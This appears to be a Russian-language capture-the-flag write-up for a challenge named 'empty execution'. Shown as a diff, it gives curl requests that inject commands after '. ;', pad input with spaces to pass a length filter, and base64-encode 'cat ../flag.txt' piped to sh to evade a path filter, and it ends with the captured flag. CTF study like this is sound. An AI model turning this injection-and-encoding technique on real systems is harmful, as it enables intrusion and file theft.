@@ -1,0 +1,48 @@
+Выполняем через запросы curl
+
+curl -X POST -H "Content-Type: application/json" https://braekerctf-empty-execution.chals.io/run_command -d '{"command":""}' 
+
+Смотрим исходный код и из него определяем следующее: 
+    1. Флаг лежит в корне веб-приложения
+    2. Во время запуска приложения производится переход в директорию ./executables
+    3. Для чтения файла необходимо выполнить команду "cat ../flag.txt"
+    4. Приложение не разрешает использование ".." и "/" - следовательно надо обходить фильтр
+    5. Приложение фильтрует команды по длине (от 5 символов)
+
+Пробуем вводить разные команды. В большинстве случаев получаем {"message":"Not implemented"}
+
+Есть возможность обойти фильтр по длине команды, используя пробелы: 
+    curl -X POST -H "Content-Type: application/json" https://braekerctf-empty-execution.chals.io/run_command -d '{"command":"      "}'
+
+    {"message":"Command output: "}
+
+Еще можно использовать команду ".". Результат тот же.
+Смотрим, что выполняет команда в терминале Linux:
+    .: not enough arguments
+
+Если развернуть приложение локально и отслеживать вывод в консоль, то после выполнения ". whoami" получим следующий вывод в консоли: 
+    
+    curl -X POST http://127.0.0.1/run_command -H "Content-Type: application/json" -d '{"command":"    . ls"}' 
+    {"message":"Command output: "}
+
+    Консоль:
+    /bin/sh: 1: /usr/bin/ls: Syntax error: ";" unexpected
+
+Пробуем тыкать ";" и перебирать команды: 
+    
+    curl -X POST https://braekerctf-empty-execution.chals.io/run_command -H "Content-Type: application/json" -d '{"command":". ;whoami"}'
+    {"message":"Command output: ctf\n"}
+
+Получилось выполнять команды, теперь необходимо обойти фильтр на блокировку обхода путей:
+    curl -X POST https://braekerctf-empty-execution.chals.io/run_command -H "Content-Type: application/json" -d '{"command":". ;cat ../flag.txt"}'
+
+    {"message":"Hacking attempt detected"}
+
+Можно локально загрузиться или сделать это в ручную: проверить, доступны ли команды, типа base64 для того, чтобы выполнить закодированную команду, совершив обход парсера строки
+На сервере есть возможность исполнять команду base64. 
+Теперь необходимо сделать полезную нагрузку: 
+    cat ../flag.txt -> echo Y2F0IC4uL2ZsYWcudHh0 | base64 -d | sh
+
+    curl -X POST -H "Content-Type: application/json" -d '{"command":" . ;echo Y2F0IC4uL2ZsYWcudHh0 | base64 -d | sh"}' https://braekerctf-empty-execution.chals.io/run_command
+
+    {"message":"Command output: brck{Ch33r_Up_BuddY_JU5t_3x3Cut3_4_D1reCT0ry}"}
